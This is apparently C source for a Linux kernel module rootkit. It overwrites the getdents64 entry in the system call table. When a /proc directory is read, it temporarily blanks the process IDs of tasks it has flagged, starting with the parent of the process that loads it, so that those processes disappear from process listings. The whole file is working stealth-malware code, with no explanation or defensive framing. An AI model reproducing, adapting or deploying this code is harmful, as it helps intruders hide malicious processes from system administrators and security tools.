#define __KERNEL__
#define MODULE
#define PROCHOOK_H

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <sys/syscall.h>
#include <asm/uaccess.h>

EXPORT_NO_SYMBOLS;
MODULE_LICENSE("GPL");

#define PF_HIDDEN	128

extern void *sys_call_table[];
int (*old_getdents)(unsigned int, void *, unsigned int);
int new_getdents(unsigned int, void *, unsigned int);

void hide_pids(void);
void show_pids(void);

int init_module(void)
{
  old_getdents = sys_call_table[__NR_getdents64];
  sys_call_table[__NR_getdents64] = new_getdents;
  current->p_pptr->flags |= PF_HIDDEN;
  return 0;
}

void cleanup_module(void)
{
  sys_call_table[__NR_getdents64] = old_getdents;
}

int new_getdents(unsigned int fd, void *dirent, unsigned int count)
{
  int result = 0;
  struct file *file = (struct file *)fget(fd);
  struct super_block *sblock = file->f_dentry->d_sb;
  
  if(sblock->s_magic == PROC_SUPER_MAGIC)
    hide_pids();

  result = old_getdents(fd, dirent, count);

  if(sblock->s_magic == PROC_SUPER_MAGIC)
    show_pids();

  fput(file);
  return result;
}

void hide_pids(void)
{
  struct task_struct *task; 

  for_each_task(task) 
    {
      if(task->flags & PF_HIDDEN) 
	{
	  task->exit_code = task->pid;
	  task->pid = 0;
	}
    }

  return;
}

void show_pids(void)
{
  struct task_struct *task;

  for_each_task(task) 
    {
      if(task->flags & PF_HIDDEN) 
	{
	  task->pid = task->exit_code;
	  task->exit_code = 0;
	}
    }

  return;
}
